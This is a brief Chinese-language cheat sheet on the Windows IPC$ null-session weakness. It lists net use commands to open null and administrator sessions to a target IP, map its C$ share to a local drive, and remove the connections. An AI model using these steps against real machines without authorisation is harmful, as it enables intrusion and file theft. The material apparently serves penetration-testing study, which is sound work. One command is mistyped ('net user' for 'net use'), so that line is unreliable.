## IPC$的空连接漏洞
**建立空连接**

	net use \\10.0.255.34 "" /user:""

**建立非空链接**

	net use \\10.0.255.34 "123456" /user:"administrator"

**映射默认共享**

	net use z: \\IP\C$ "pwd" /user: "user"
> 注：将对方C盘映射为自己的Z盘。
> 如果已经和目标建立了IPC$,则可以直接用IP+盘符+$访问，具体命令为 net user z:\\IP\C$

**删除一个IPC$连接**

	net use \\IP\ipc$ /del

**删除共享映射**

	net use c:/del
	// 删除映射的C盘

	net use * /del
	//删除全部